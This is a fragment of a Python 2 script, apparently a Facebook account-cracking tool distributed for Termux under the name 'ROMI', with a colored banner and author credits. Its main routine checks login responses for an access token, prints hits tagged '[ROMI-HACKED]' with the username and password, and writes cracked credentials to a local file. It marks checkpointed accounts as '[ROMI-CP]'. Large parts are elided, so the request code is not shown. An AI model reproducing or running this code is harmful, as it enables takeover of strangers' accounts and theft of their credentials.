#Tools Created By Romi
#No channel 
#The Hacker Of Bangladesh
...
\033[0;94m ___  ____  __  _______      
\033[0;94m / _ \/ __ \/  |/  /  _/
\033[0;96m / , _/ /_/ / /|_/ // /  
\033[0;96m/ /_/|_|\____/_/  /_/___/  
""")

print("\033[0;91mThis Tool's Free By ROMI islam")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : ROMI islam'
    print '\033[0;94mFACEBOOK : Termux teacher ROMI'
    print '\033[0;96mGITHUB   : TermuxROMI'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ROMI-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[ROMI-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
